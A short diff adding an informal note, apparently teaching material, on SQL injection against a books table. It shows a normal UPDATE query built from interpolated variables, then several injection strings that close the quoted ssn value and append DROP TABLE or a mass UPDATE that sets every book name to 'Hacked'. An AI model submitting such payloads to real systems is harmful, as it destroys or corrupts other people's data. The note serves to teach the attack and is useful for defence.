@@ -1,0 +1,14 @@
+so, here are a few different sql examples to attmept to do things within the database:
+
+'; DROP TABLE books; --
+
+
+this would be the normal command to find books based upon an ssn number:
+UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';
+
+however, we could craft a particular ssn number in order to trip the system out:
+12345'; UPDATE books SET book_name = 'Hacked'; --
+
+we could also do something like:
+
+12345'; DROP TABLE hello;--
